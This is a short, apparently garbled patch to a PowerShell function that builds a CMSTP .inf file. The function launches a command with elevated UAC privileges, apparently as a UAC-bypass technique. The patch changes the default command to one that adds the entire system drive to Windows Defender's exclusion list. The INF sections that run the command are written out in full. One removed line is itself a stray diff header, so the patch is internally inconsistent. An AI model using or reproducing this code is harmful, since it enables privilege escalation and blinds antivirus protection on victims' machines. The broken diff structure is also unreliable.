@@ -5,13 +5,16 @@ Function script:Set-INFFile {
 	$InfFileLocation = "$env:temp\CMSTP.inf",
 	
 	[Parameter(HelpMessage="Specify the command to launch in a UAC-privileged window")]
-	[String]$CommandToExecute = 'cmd.exe /c powershell.exe Set-MpPreference -ExclusionPath $env:USERPROFILE'
+	[String]$CommandToExecute = 'cmd.exe /c powershell.exe Set-MpPreference -ExclusionPath $env:HOMEDRIVE'
 	)
 
 $InfContent = @"
 [version]
 Signature=`$chicago`$
-@@ -18,115 +9,21 @@ CustomDestination=CustInstDestSectionAllUsers
+AdvancedINF=2.5
+
+[DefaultInstall]
+CustomDestination=CustInstDestSectionAllUsers
 RunPreSetupCommands=RunPreSetupCommandsSection
 
 [RunPreSetupCommandsSection]
